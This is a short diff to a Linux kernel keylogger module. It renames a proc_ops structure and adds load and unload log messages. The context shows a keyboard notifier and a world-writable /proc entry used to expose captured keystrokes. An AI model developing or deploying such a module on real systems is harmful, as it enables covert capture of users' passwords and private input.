@@ -117,13 +117,14 @@ static struct notifier_block keylogger_nb = {
     notifier_call: keylogger_callback,
 };
 
-static struct proc_ops keylogger_proc_fops = {
+static struct proc_ops keylogger_proc_ops = {
     proc_read: read_proc,
 };
 
 static int __init keylogger_init(void)
 {
-    proc_file = proc_create(PROC_FILENAME, 0666, NULL, &keylogger_proc_fops);
+    printk(KERN_INFO "keylogger: Module loaded");
+    proc_file = proc_create(PROC_FILENAME, 0666, NULL, &keylogger_proc_ops);
     if (!proc_file) return -ENOMEM;
 
     memset(&db, 0, sizeof(db));
@@ -136,6 +137,7 @@ static int __init keylogger_init(void)
 
 static void __exit keylogger_exit(void)
 {
+    printk(KERN_INFO "keylogger: Module unloaded");
     unregister_keyboard_notifier(&keylogger_nb);
     remove_proc_entry(PROC_FILENAME, NULL);
 }
